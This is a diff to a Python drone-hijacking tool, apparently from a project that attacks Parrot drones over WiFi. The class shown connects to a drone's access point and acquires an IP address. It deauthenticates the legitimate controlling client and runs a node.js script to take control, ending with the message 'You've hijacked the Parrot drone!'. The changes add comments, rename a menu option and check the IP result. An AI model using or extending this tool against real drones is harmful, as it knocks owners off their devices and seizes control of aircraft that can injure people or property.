@@ -31,10 +31,12 @@ class ParrotHacker:
 
     def __init__(self, wlan, parrot_ap):
         """ Initialize the Parrot hacker class. """
+        # Init vars
         self.wlan = wlan
         self.ap   = parrot_ap
         self.clients = []
 
+        # Init menu
         self.menu = Menu(
                     ("Hacking menu for", self.ap.short_str()),
                     ("Your choice:"),
@@ -42,7 +44,7 @@ class ParrotHacker:
                     no_num_opts_msg="No client detected. Try to search for new connected clients!",
                     exit_on_ctrlc  =False
                 )
-        self.menu.add_static_opt('S', "Search for new connected clients", self.search_new_clients)
+        self.menu.add_static_opt('R', "Refresh clients list", self.search_new_clients)
         self.menu.add_static_opt('T', "Take control (no connected clients)", self.take_control)
         self.menu.add_static_opt('C', "Clear client list", self.clear_clients_list)
 
@@ -57,6 +59,10 @@ class ParrotHacker:
 
     def hack(self):
         """ Hacks current AP. """
+        # Search for clients
+        self.search_new_clients()
+
+        # Show menu
         self.menu.run()
 
 
@@ -103,18 +109,21 @@ class ParrotHacker:
         self.wlan.connect_access_point(self.ap)
 
         disp.info("Acquiring IP from drone")
-        self.wlan.acquire_ip()
+        ip_ok = self.wlan.acquire_ip()
 
-        disp.info("Taking drone control")
-        do("cd", controljs_dir, ';', nodejs, controljs)
+        if ip_ok:
+            disp.info("Taking drone control")
+            do("cd", controljs_dir, ';', nodejs, controljs, force_output=True)
 
-        disp.info("Well done! You've hijacked the Parrot drone! :)")
+            disp.info("Well done! You've hijacked the Parrot drone! :)")
 
 
     def disconnect_then_control(self, client):
         """ Disconnects a client then take control. """
+        # Disconnect client
         disp.info("Disconnecting client", client)
         self.wlan.deauth_client(client, self.ap)
 
+        # Take control
         self.take_control()
 
